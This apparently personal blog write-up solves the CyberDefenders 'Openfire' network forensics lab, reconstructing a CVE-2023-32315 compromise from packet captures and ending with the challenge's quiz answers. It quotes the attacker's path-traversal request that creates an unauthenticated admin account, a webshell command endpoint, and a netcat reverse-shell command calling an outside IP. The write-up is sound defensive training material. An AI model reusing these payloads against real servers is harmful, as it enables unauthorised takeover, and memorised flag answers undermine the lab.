---
layout: lab
title: Openfire
platform: CyberDefenders
difficulty: Easy
category: Network Forensics
tools: Wireshark
tactics: "[Initial Access, Execution, Persistence, Discovery, Command and Control]"
proof: https://cyberdefenders.org/blueteam-ctf-challenges/achievements/inksec/openfire/
challenge_url: https://cyberdefenders.org/blueteam-ctf-challenges/openfire/
permalink: /blue-team/labs/openfire/
summary: '"Reconstruct an Openfire server attack timeline by analyzing PCAP files with Wireshark to identify login attempts, plugin uploads, command execution, and the exploited CVE-2023-32315 vulnerability."'
art: https://cyberdefenders.org/blueteam-ctf-challenges/openfire/
---
## Scenario

An Openfire messaging server was compromised in a data breach exposing sensitive communications. Network capture files were provided to identify the exploitation method, trace attacker actions, and extract indicators of compromise.

---

## Tooling

- Wireshark

---

## Investigation

### Initial Access — Credential Harvesting

Filtering for POST requests to identify login activity:

`http.request.method == "POST"`

This revealed a login request containing a CSRF token and plaintext credentials:

- **CSRF Token:** `tmJU6J9uym8oIOD`
- **Password:** `Admin@Passw0rd#@#`
![openfire_token.png](openfire_token.png)

### Account Creation via Path Traversal

Filtering for GET requests exposed the attacker exploiting CVE-2023-32315 — an authentication bypass in Openfire's setup console — to create a new administrative account via path traversal:

`http.request.method == "GET"`

The malicious request:

`GET /setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=yGWwGRL3IKMHPFX&username=3536rr&password=dc0b2y&passwordConfirm=dc0b2y&isadmin=on`

The URL-encoded `%u002e%u002e` sequences decode to `..` — traversing out of the setup directory to reach the user creation endpoint without authentication.

- **Username created:** `3536rr`
- **Password:** `dc0b2y`
![openfire_username.png](openfire_username.png)

### Admin Panel Access

With the newly created account, the attacker authenticated to the admin panel using a second account:

- **Username:** `a7zo4l`
![openfire_login.png](openfire_login.png)

### Malicious Plugin Upload

Following the HTTP stream for `plugin-admin.jsp?uploadplugin` revealed the attacker uploading a malicious plugin to establish persistent code execution:

- **Plugin filename:** `openfire-plugin.jar`
![openfire_plugin.png](openfire_plugin.png)

### Webshell Execution

With the plugin active, the attacker used the exposed `cmd.jsp` endpoint to execute commands:

`POST /plugins/openfire-plugin/cmd.jsp?action=command HTTP/1.1`

First command executed: `whoami`

![openfire_whoami.png](openfire_whoami.png)

The attacker then established a reverse shell using netcat:

`command=nc+192.168.18.160+8888+-e+%2Fbin%2Fbash`

Decoded: `nc 192.168.18.160 8888 -e /bin/bash`

![openfire_revshell.png](openfire_revshell.png)

### Post-Exploitation Reconnaissance

Following the reverse shell stream revealed host reconnaissance commands:

- `ifconfig` — enumerate network interfaces
- `id` — confirm running user privileges
- `uname -a` — identify OS and kernel version
- `whoami` — confirm execution context

![openfire_ifconfig.png](openfire_ifconfig.png)
## IOCs 

| Type               | Value               |
| ------------------ | ------------------- |
| IP                 | 192.168.18.160      |
| CVE                | CVE-2023-32315      |
| CSRF Token         | tmJU6J9uym8oIOD     |
| Admin Password     | Admin@Passw0rd#@#   |
| Created Username   | 3536rr              |
| Admin Username     | a7zo4l              |
| Malicious Plugin   | openfire-plugin.jar |
| Reverse Shell Port | 8888                |
## Conclusion

> The attacker exploited CVE-2023-32315, an authentication bypass in Openfire's setup console, using path traversal to create a rogue admin account without credentials. After authenticating to the admin panel, they uploaded a malicious JAR plugin exposing a command execution endpoint, then used it to spawn a netcat reverse shell and conduct post-exploitation reconnaissance.

---

## References

- [CVE-2023-32315 — Openfire Authentication Bypass](https://nvd.nist.gov/vuln/detail/cve-2023-32315)
- [MITRE T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [MITRE T1059 — Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
- [MITRE T1048 — Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048/)
- [CyberDefenders — Openfire Lab](https://cyberdefenders.org/blueteam-ctf-challenges/openfire/)


{% include flag.html question="What is the CSRF token value for the first login request?" answer="tmJU6J9uym8oIOD" %}

{% include answer.html question="What is the password of the first user who logged in?" answer="Admin@Passw0rd#@#" %}

{% include flag.html question="What is the 1st username that was created by the attacker?" answer="3536rr" %}

{% include answer.html question="What is the username that the attacker used to login to the admin panel?" answer="a7zo4l" %}

{% include flag.html question="What is the name of the plugin that the attacker uploaded?" answer="openfire-plugin.jar" %}

{% include answer.html question="What is the first command that the user executed?" answer="whoami" %}

{% include flag.html question="Which tool did the attacker use to get a reverse shell?" answer="netcat" %}

{% include answer.html question="Which command did the attacker execute on the server to check for network interfaces?" answer="ifconfig" %}

{% include flag.html question="What is the CVE of the vulnerability exploited?" answer="CVE-2023-32315" %}


I successfully completed Openfire Blue Team Lab at @CyberDefenders!
https://cyberdefenders.org/blueteam-ctf-challenges/achievements/inksec/openfire/
 
#CyberDefenders #CyberSecurity #BlueYard #BlueTeam #InfoSec #SOC #SOCAnalyst #DFIR #CCD #CyberDefender